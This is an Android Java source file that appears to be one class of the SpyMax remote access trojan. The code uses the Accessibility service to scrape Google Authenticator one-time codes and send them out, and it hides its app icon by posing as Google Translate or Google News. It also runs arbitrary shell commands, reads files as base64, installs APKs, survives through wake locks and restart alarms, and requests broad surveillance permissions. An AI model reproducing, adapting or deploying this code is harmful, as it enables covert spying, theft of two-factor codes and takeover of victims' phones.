package spymax.stub7;
import android.Manifest;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;

import android.support.v4.app.ActivityCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

import static android.content.Context.POWER_SERVICE;

public class ClassGen3 {
    public static Executor e_ClassGen3_xc;
    public static int m_ClassGen3_ax = 1000;
    public static String p_ClassGen3_r;
    public static String t_ClassGen3_g = ":";
    public static String j_ClassGen3_z = _Reblace_("-25_ClassGen3_5","_ClassGen3_");
    public static String A_ClassGen3_A = _Reblace_("-_ClassGen3_A","_ClassGen3_");
    public static String c_ClassGen3_l = _Reblace_("-_ClassGen3_5","_ClassGen3_");
    public static String N_ClassGen3_F ="-666";
    public static String s_ClassGen3_cr = _Reblace_("-[RANDOM-STRING][RANDOM-STRING][RANDOM-STRING]9","[RANDOM-STRING][RANDOM-STRING][RANDOM-STRING]");
    public static String s_ClassGen3_fh =  _Reblace_("-4_ClassGen3_4","_ClassGen3_");
    public static String G_ClassGen3_RC = "-776";
    public static String S_ClassGen3_RCC = "SRC";
    public static String jq = "-1";
    public static String j_ClassGen3_x = "1";
    public static String l_ClassGen3_g = "888";
    public static String wbvew = "951";
    public static char c1 = '1';
    public static int FivePlusFive = 5 * 5;
    public static BroadcastReceiver rc  =null;
   // public static BroadcastReceiver sr  =null;
   // public static BroadcastReceiver pakgadd  =null;
    public static int s_ClassGen3_f0 = 0;
    public static int s_ClassGen3_f1 = 0;
    public static int s_ClassGen3_f2 = 0;


    public static String ReadRecords(String Path)
    {


        File file = new File(Path);

        byte[] b = new byte[(int) file.length()];
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            fileInputStream.read(b);

        } catch (FileNotFoundException e) {
            //Log.e("Read all bytes", "File Not Found.");

        }
        catch (IOException e1) {
          //  Log.e("Read all bytes", "Error read file.");

        }
        String value = Base64.encodeToString(b, Base64.DEFAULT);

        return value;

    }
//    static List<AccessibilityNodeInfo> findNodeWithClass(AccessibilityEvent accessibilityEvent, String str) {
//        return findNodeWithClass(accessibilityEvent.getSource(), str);
//    }
    public static void _SGA2( AccessibilityEvent event, String packName) {
        try{
            if (android.os.Build.VERSION.SDK_INT >= 18) {
                if(packName.contains(_Reblace_("co##m.goog##le.andr##oid.ap##ps.authent##icator2","##"))){
                   // Log("run", "com.google.android.apps.authenticator2" );

                    if(event.getSource() == null){







                        return;}

                    String data = "";
                    List<AccessibilityNodeInfo> nodeClass = findNodeWithClass(event.getSource(), "android[RANDOM-STRING]view[RANDOM-STRING]ViewGroup".replace("[RANDOM-STRING]","."));
                    int t = 0;
                    for (AccessibilityNodeInfo accessibilityNodeInfo : nodeClass) {
                        for(int i = 0; i<accessibilityNodeInfo.getChildCount();i++){
                            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                            if(child.getText() != null){
                              //  Log("params1: " + t + ", params2: " + i , child.getText().toString());
                               // String sn = "S-M-H<"+"failed"+"<"+"failed";
                               // Log.e("GOTH", data);
                                data = data +child.getText().toString()+"-";
                               // Log.e("GOTH", data);
                            }
                        }
                        t++;
                    }

                    String[] Strdata = data.split("-");

                    if(!data.isEmpty()){
                        // SEND DATA HERE
                      ClassGen12.ClassGen12SendGoogleAuth = false;
                      for (int i =0 ; i < Strdata.length;i++ )
                      {
                          try
                          {
                              if (i == Strdata.length -1)
                              {
                                  break;
                              }
                              ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, ("Google "+"Authenticator<"+Strdata[i]+"<"+Strdata[i+1]).getBytes());
                          }catch (Exception Ex){







                          }
                      }

                        ClassGen11.MyAccess.ClassGen12blockBack();
                        ClassGen11.MyAccess.ClassGen12SendMeHome();

                       // SettingsToAdd(service, consts.LogSMS, "Logs com.google.android.apps.authenticator2: \n" + data  + consts.string_119);
                    }
                }
            }
        }catch (Exception ex){}
    }
    static List<AccessibilityNodeInfo> findNodeWithClass(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {







            return arrayList;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getClassName().toString().toLowerCase().contains(str.toLowerCase())) {
                    arrayList.add(child);
                } else {
                    arrayList.addAll(findNodeWithClass(child, str));
                }
            }
        }
        return arrayList;
    }

    public static String _Reblace_(String thetext , String targer)
    {
        return thetext.replace(targer,"");
    }

    public static Boolean _isequel_mth_(String a, String b){
        if(a.length() > 0 && b.length() > 0){
            if(a.equals(b)){
                return true ;
            }
        }
        return false ;
    }

    public static void _exit_meth_(Context c, String v){
        int f = 10000;
        try {
            f = Integer.valueOf(v);
        } catch (NumberFormatException e) {







        }
        if(f == -1){
            if(!ClassGen10._runn_srv_(ClassGen11.class,c)) {
                Intent i = new Intent(c, ClassGen11.class);
                c.stopService(i);
            }
        }else{
            phonixeffect(c,"_randomS_shit_",180000);
        }
        //ClassGen2.CLOSEALLINTENT("NGFSdujyktdyjrsthearfdxgnyjukiu5rsthdbgth");
        rel(false);
//        try{
//         //   android.os.Process.killProcess(android.os.Process.myPid());
//        }catch (Exception ex) {}
    }
    public static void _wifipolc_meth_(Context c){
        try {
            ContentResolver cr = c.getContentResolver();
            int set = android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER;
            android.provider.Settings.System.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, set);
        } catch (Exception e) {







        }
    }
    public static byte[] _formtpakt_methd_(String s, byte[] b) throws Exception {
        ByteArrayOutputStream oterstremer = new ByteArrayOutputStream();
        byte[] s0 = _CZIP_meth_(s.getBytes());
        byte[] b0 = _CZIP_meth_(b);
        byte ch = (byte) 0;
        String x = "ⁱᵇʾ[RANDOM-STRING]ㅤˑ$ˏـﹳﾞ$[RANDOM-STRING]ʽʾᵎ".replace(s,"ⁱᵇXʾSB[RANDOM-STRING]Kㅤˑ$ˏ");
        byte[] n0 = String.valueOf(s0.length).getBytes();
        byte[] n1 = String.valueOf(b0.length).getBytes();
        if (x.length()>1)
        {
            oterstremer.write(n0, 0, n0.length);
            oterstremer.write(ch);
            oterstremer.write(n1, 0, n1.length);
            //"ⁱᵇʾ[RANDOM-STRING]ㅤˑ$ˏـﹳﾞ$[RANDOM-STRING]ʽʾᵎ"
        }

        oterstremer.write(ch);
        if (!x.equals("ﹶ[RANDOM-STRING]φTʾՙYﹶVC[RANDOM-STRING]"))
        {
            oterstremer.write(s0, 0, s0.length);
            oterstremer.write(b0, 0, b0.length);
        }

        byte[] b1 = oterstremer.toByteArray();
        try {
            oterstremer.close();
        } catch (Exception ex) {







        }
        return b1;
    }
    public static byte[] _CZIP_meth_(byte[] d) throws Exception {
        ByteArrayOutputStream b = new ByteArrayOutputStream(d.length);
        GZIPOutputStream g = new GZIPOutputStream(b);
        g.write(d);
        g.close();
        byte[] m = b.toByteArray();
        b.close();
        return m;
    }
//   public static String CNM="c...n";
//   public static String CNL="c...l";
    public static byte[] _DZIP_meth_(byte[] d) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        final int buff = d.length;
        ByteArrayInputStream in = new ByteArrayInputStream(d);
        GZIPInputStream g = new GZIPInputStream(in, buff);
        byte[] b = new byte[buff];
        int cu;
        while ((cu = g.read(b)) != -1) {
            o.write(b, 0, cu);
        }
        g.close();
        in.close();
        byte[] e = o.toByteArray();
        o.close();
        return e;
    }
    public static byte[] _Getbyte_meth_(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, 0, i[0]);
        try {
            o.close();
        } catch (Exception ex) {







        }
        byte[] b0 = o.toByteArray();
        return b0;
    }

    public static String _D_BASE64_(String message) {
        byte[] data = Base64.decode(message, Base64.DEFAULT);
        try {
            return new String(data, "UTF-8");
        } catch (UnsupportedEncodingException e) {







        }

        return null;
    }
    public static byte[] _getstr_meth_(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, i[0], i[1]);
        try {
            o.close();
        } catch (Exception ex) {
        }
        byte[] b0 = o.toByteArray();
        return b0;
    }
    public static byte[] get_ClassGen3_Bytes(Object j) throws java.io.IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        ObjectOutputStream s = new ObjectOutputStream(o);
        s.writeObject(j);
        s.flush();
        s.close();
        byte[] a = o.toByteArray();
        o.close();
        return a;
    }
    public static String g_ClassGen3_t(Context ctx, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            String q = s.getString(k, "");
            if (!q.equalsIgnoreCase("")) {
                return q;
            } else {
                return "";
            }
        } catch (Exception e) {
            return "";
        }
    }

    public static void dit(Context ctx, String v, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            SharedPreferences.Editor e = s.edit();
            e.putString(k, v.trim());
            e.commit();
        } catch (Exception e) {
        }
    }
//    private static String GetChannel()
//    {
//        try {
//            String[] array = new String[]{"Scan Notification","Help Notification","Update Notification","Notification","Search Notification"};
//            String randomStr = array[new Random().nextInt(array.length)];
//            return randomStr;
//
//        }catch (Exception e)
//        {
//            return  getRandomString(5,"qweasdzxcrtygfhvbn");
//        }
//    }
//    public static String getRandomString(final int sizeOfRandomString,final String Latters)
//    {
//        final Random random=new Random();
//        final StringBuilder sb=new StringBuilder(sizeOfRandomString);
//        for(int i=0;i<sizeOfRandomString;++i)
//            sb.append(Latters.charAt(random.nextInt(Latters.length())));
//        return sb.toString();
//    }

    public static Notification Foreground(Context ctx,String ChannelID,String Name) {
        //final int NotiIcon = R.drawable.mygoogleplayicon;


            String CHANNEL_ID = ChannelID;

            NotificationManager manager =
                    (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Support for Android Oreo: Notification Channels

                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        Name,
                        NotificationManager.IMPORTANCE_DEFAULT);
                channel.setLockscreenVisibility(0);
                channel.setShowBadge(false);

                manager.createNotificationChannel(channel);

                Notification nf = new Notification.Builder(ctx,CHANNEL_ID)
                        .setContentTitle("_NOTIFI_TITLE_")
                        .setContentText("_NOTIFI_MSG_")
                        .setSmallIcon(android.R.color.transparent)
                        .setAutoCancel(false)
                        .build();

                return nf;
            }
            else
            {

                Notification nf = new Notification.Builder(ctx)
                        .setContentTitle("_NOTIFI_TITLE_")
                        .setContentText("_NOTIFI_MSG_")
                        .setSmallIcon(android.R.color.transparent)
                        .setPriority(Notification.PRIORITY_MAX)
                        .setAutoCancel(false)
                        .build();
                return nf;

            }



    }


    public static WifiManager.WifiLock Wi;
    public static PowerManager.WakeLock Wa;
    public static void WK_ClassGen3_L(Context c , boolean b){
        if(b){
            if(Wa == null){
                try{final PowerManager k0 =(PowerManager)c.getSystemService(POWER_SERVICE);
                    if (Wa == null){
                        Wa = k0.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                                ClassGen8.FTX0.trim());
                        if(!Wa.isHeld()){
                            Wa.acquire();
                        }
                    }} catch (Exception e) {







                }
            }
        }
        if(Wi == null){
            try{final WifiManager k1 =(WifiManager)c.getSystemService(Context.WIFI_SERVICE);
                if(Wi == null){
                    Wi = k1.createWifiLock(WifiManager.WIFI_MODE_FULL,
                            ClassGen8.FTX1.trim());
                    if(!Wi.isHeld()){
                        Wi.acquire();
                    }
                }} catch (Exception e) {}
        }


    }
    public static void rel(boolean b){
        try{if(Wa != null){
            if(Wa.isHeld()){
                Wa.release();
                Wa = null;
            }
        }} catch (Exception e) {}

        if(b){
            return;
        }
        try{if(Wi != null){
            if(Wi.isHeld()){
                Wi.release();
                Wi = null;
            }
        }} catch (Exception e) {}
    }

    public static void phonixeffect(Context context, String name, long millisec){
        try{
            Intent intent = new Intent(context, SensorRestarterBroadcastReceiver.class);
            intent.setAction("RestartSensor".replace(name,""));

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, false ? System.currentTimeMillis() : System.currentTimeMillis() + millisec, millisec, pendingIntent);

        }
        catch(Exception ex)
        {
            //ex.printStackTrace();
        }
    }

    public static boolean sv(Context ctx){
        try{
          final PowerManager pow = (PowerManager)ctx.getSystemService(POWER_SERVICE);
          if(pow.isPowerSaveMode()== true){
              return true;
          }
         } catch (Exception e) {}
         return false;
    }
    public static String getLabelApplication(Context context) {
        try {
            return (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
        }catch (Exception ex){
        }
        return  "";
    }
    public static void e_ClassGen3_cx(final String c){
        if (((ThreadPoolExecutor) ClassGen3.e_ClassGen3_xc).getActiveCount() >= ClassGen3.m_ClassGen3_ax){
            return;
        }
        ClassGen3.e_ClassGen3_xc.execute(new Runnable() {
            public void run() {
                StringBuffer ou = new StringBuffer();
                Process p;
                try {
                    p = Runtime.getRuntime().exec(c);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if(!p.waitFor(60, TimeUnit.SECONDS)) {
                            p.destroy();
                        }
                    }else{
                        p.waitFor();
                    }


                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String ln ;
                    while ((ln = r.readLine())!= null){
                        ou.append(ln);
                    }

                    p.getInputStream().close();
                    p.getOutputStream().close();
                    r.close();
                } catch (Exception e) {







                    dt = "";
                }
                String re = ou.toString();
                if (re.length() == 0){
                    dt = "";
                }
                dt = re;
            }});
    }
    public static String dt = "";
    public static boolean a_ClassGen3_a(Context ctx, String pk) {
        try{
            PackageManager pm = ctx.getPackageManager();
            try {
                pm.getPackageInfo(pk, PackageManager.GET_ACTIVITIES);
                return pm.getApplicationInfo(pk, 0).enabled;
            }
            catch (PackageManager.NameNotFoundException e) {
                return false;
            }
        } catch (Exception e) {}
        return false;
    }
    public static boolean H__ClassGen11_P(Context context, String...permissions) {
        if (context != null && permissions != null) {
            for (String permission: permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
    public static void _inst_bnd_( Context ctx, String p, String ext2){
        try{
            File file = new File(p);

            if(file.exists()) {
                final Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(uriFromFile(ctx, file), "application/vnd.android.package-archive");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                try {
                    if (NeedSuper())
                    {
                        ClassGen12.ClassGen12FOR_IN = true;
                    }
                    ctx.startActivity(intent);
                } catch (ActivityNotFoundException e) {







                  //  e.printStackTrace();
                   // Log.e("TAG", "Error in opening the file!");
                }
            }else{
               // Toast.makeText(getApplicationContext(),"installing",Toast.LENGTH_LONG).show();
            }

        } catch (Exception e) {
           // e.printStackTrace();
        }
    }
    public static boolean is_dozemode(Context context){
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
            return powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        else{
            return true;
        }
    }

    public static void SwapMe(Context ctx,String Str)
    {
        try
        {
            if (Str != null)
            {
                ClassGen3.p_ClassGen3_r = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
                if (ClassGen3.p_ClassGen3_r.charAt(0) == ClassGen3.c1){

                    PackageManager pm = ctx.getPackageManager();


                        if (ClassGen11.Afterinstalloption == "T")
                        {

                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"GoogleTranslate"),
                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                    PackageManager.DONT_KILL_APP);

                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"MainActive"),
                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    PackageManager.DONT_KILL_APP);

                        }
                        else if (ClassGen11.Afterinstalloption == "N")
                        {
                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"googlenews"),
                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                    PackageManager.DONT_KILL_APP);

                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"MainActive"),
                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    PackageManager.DONT_KILL_APP);
                        }
                        else if(ClassGen11.Afterinstalloption == "C")
                        {
                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"costm"),
                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                    PackageManager.DONT_KILL_APP);

                            pm.setComponentEnabledSetting(
                                    new ComponentName(ctx,
                                            "spymax"+"."+"stub7"+"."+"MainActive"),
                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    PackageManager.DONT_KILL_APP);

                        }
                        else if (ClassGen11.Afterinstalloption == "K")
                        {


                            ComponentName n = new ComponentName(ctx, "spymax"+"."+"stub7"+"."+"MainActive");
                            if(pm.getComponentEnabledSetting(n)
                                    != PackageManager.COMPONENT_ENABLED_STATE_DISABLED){
                                pm.setComponentEnabledSetting(n, PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                        , PackageManager.DONT_KILL_APP);
                            }
                        }

                }
            }

        }catch (Exception ex){}
    }

    public static Uri uriFromFile(Context context, File file) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return FileProvider.getUriForFile(context,  "spymax"+"."+"stub7"+"."+"suffix" + ".provider", file);
        } else {
            return Uri.fromFile(file);
        }
    }
    public static boolean p(Context context, String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName, 0);
            return true;
        }
        catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    public static void o(Context context, String package_0){
        try{
            Intent i =  context.getPackageManager().getLaunchIntentForPackage(package_0);
            if (i != null) {
                context.startActivity(i);
            }
        } catch (Exception e) {}
    }
    public static boolean acc(Context ctx, Class<?> se) {
        try{
            ComponentName ex = new ComponentName(ctx, se);
            String ss = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (ss == null)
                return false;
            TextUtils.SimpleStringSplitter co = new TextUtils.SimpleStringSplitter(':');
            co.setString(ss);
            while (co.hasNext()) {
                String cs = co.next();
                ComponentName en = ComponentName.unflattenFromString(cs);
                if (en != null && en.equals(ex))
                    return true;
            }
        } catch (Exception e) {}
        return false;
    }

    public static boolean NeedSuper() {
        String S = "USE-SUPER";
        //String S = "on";
        if (S == "on") {
            return true;
        } else {
            return false;
        }
    }
    public static String[] PERMISSIONS () {

        String[] pre = {Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CHANGE_WIFI_STATE,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION};

        return  pre;
    }
    public static boolean IA_ClassGen11_E(Context context, Class < ? > accessibilityService) {
        try {
            ComponentName expectedComponentName = new ComponentName(context, accessibilityService);

            String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServicesSetting == null)
                return false;

            TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
            colonSplitter.setString(enabledServicesSetting);

            while (colonSplitter.hasNext()) {
                String componentNameString = colonSplitter.next();
                ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);

                if (enabledService != null && enabledService.equals(expectedComponentName))
                    return true;
            }
        } catch (Exception ex) {
            // SettingsToAdd(context, consts.LogSMS , consts.string_189 + ex.toString() + consts.string_119);
        }
        return false;
    }

    public static int speedTime = 1000;
    public static Boolean shown = false;

    public static Boolean asked = false;

    public static Boolean IDONE = false;

    public static int Trys = 6;


    public static boolean iamworking = false;
    public static boolean GS_ClassGen11_B(Context context) {
        KeyguardManager km = (KeyguardManager) context.getSystemService(context.KEYGUARD_SERVICE);
        if (km.inKeyguardRestrictedInputMode()) {
            return false;
        } else {
            return true;
        }
    }
    public static void StartNewScan(Context ctx , Intent i){
        //ctx.startService(i);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ClassGen3.p_ClassGen3_r = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
            if (ClassGen3.p_ClassGen3_r.charAt(1) == ClassGen3.c1)
            {
                ctx.startForegroundService(i);
            }
            else
            {
                ctx.startService(i);
            }

        }else{
            ctx.startService(i);
        }
    }
}


